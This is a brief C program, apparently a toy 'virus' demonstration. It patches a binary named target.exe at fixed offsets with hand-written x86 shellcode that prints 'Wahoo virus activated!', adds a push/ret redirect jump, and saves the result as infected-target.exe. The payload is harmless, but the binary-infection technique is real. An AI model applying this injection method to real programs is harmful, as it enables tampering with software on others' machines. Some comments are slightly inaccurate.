#include <stdio.h>
#include <stdlib.h>

int main() {
    // char * 7328 bytes = 7328 characters = 7328 bytes
    char * buffer = (char *)malloc(sizeof(char) * 7328);
    FILE * target = fopen("target.exe", "r+b");
    fread(buffer, sizeof(char), 7328, target);
    fclose(target);

    // syscall to write to stdout shellcode
    char * syscall = "\xb8\x04\x00\x00\x00" // mov 4 (sys_write) to eax
                     "\xbb\x01\x00\x00\x00" // mov 1 (std_out) to ebx
                     "\xb9\x68\x84\x04\x08" // mov 0x08048468 (str address) to ecx
                     "\xba\x17\x00\x00\x00" // mov 24 (x17) to edx
                     "\xcd\x80" // int 0x80
                     "\xc3"; // ret

    for (int i = 0; i < 23; i++) {
        buffer[1102 + i] = syscall[i];
    }

    // string
    char * str = "Wahoo virus activated!\n";
    for (int i = 0; i < 23; i++) {
        buffer[1128 + i] = str[i];
    }

    // tricky jump
    char * jump = "\x68\x4e\x84\x04\x08" // push 0x0804844e
                  "\xc3"; // ret
    for (int i = 0; i < 6; i++) {
        buffer[1171 + i] = jump[i];
    }

    // read infect to edit
    FILE * infect = fopen("infected-target.exe", "wb");
    fwrite(buffer, sizeof(char), 7328, infect);
    fclose(infect);
    free(buffer);

    return 0;
    
}
